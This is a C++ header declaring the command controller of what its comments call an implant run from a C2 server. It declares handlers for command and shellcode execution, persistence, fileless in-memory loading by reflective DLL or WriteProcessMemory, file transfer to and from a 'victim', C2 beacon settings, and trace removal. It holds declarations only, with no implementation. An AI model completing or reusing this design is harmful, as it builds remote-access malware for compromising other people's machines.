#ifndef CONTROLLER_H
#define CONTROLLER_H


#include "MessageTypes.h"
#include "MessageHandler.h"


// TODO: 
// https://attack.mitre.org/tactics/enterprise/
class Controller
{
public:
	Controller(MessageHandler* messageHandler, ApiManager* apiManager);
	void handleDefault(const InternalMessage& msg);
	void handleNone(const InternalMessage& msg);

	// TODO: rename to handleExecuteConsoleCommand? 
	void handleExecuteCommand(const InternalMessage& msg);

	void handleExecuteShellcode(const InternalMessage& msg);

	void handleSystemInfo(const InternalMessage& msg);

	// TODO: make a subclass called PersistenceController?
	void handleEstablishPersistence(const InternalMessage& msg);

	// TODO: load bytes into memory and execute without saving a file to disk
	// TODO: make a subclass called MemLoader or memModule?
	// it can load and unload bytes using a variety of different methods like
	// virtualalloc, writeprocessmemroy, createthread, or reflectived dll loading
	void handleMemLoader(const InternalMessage& msg);

	// TODO: should be its own subclass with different ways to transfer files to victim
	void handleUpload(const InternalMessage& msg);

	// TODO: should be its own subclass with different ways to transfer files back to the attacker
	void handleDownload(const InternalMessage& msg);

	// TODO: handles updating config/settings...
	// c2 server addr, beacon interval, jitter, encryption key,
	// user agent string, proxy settings, command execution timeout,
	// which modules are enabled, privelege level to request?, transportLayer type,
	// etc...
	void handleSet(const InternalMessage& msg);

	// TODO: completly remove implant and all traces and child tasks/processes
	// that it created from the victim machine. this includes removing persistence
	void handleUninstall(const InternalMessage& msg);

	// TODO: a predefined task (defined in as a module)?
	// ex., start, stop (kill), pause, 
	void handleTask(const InternalMessage& msg);

private:
	MessageHandler* messageHandler_;
	ApiManager* apiManager_;

};

#endif
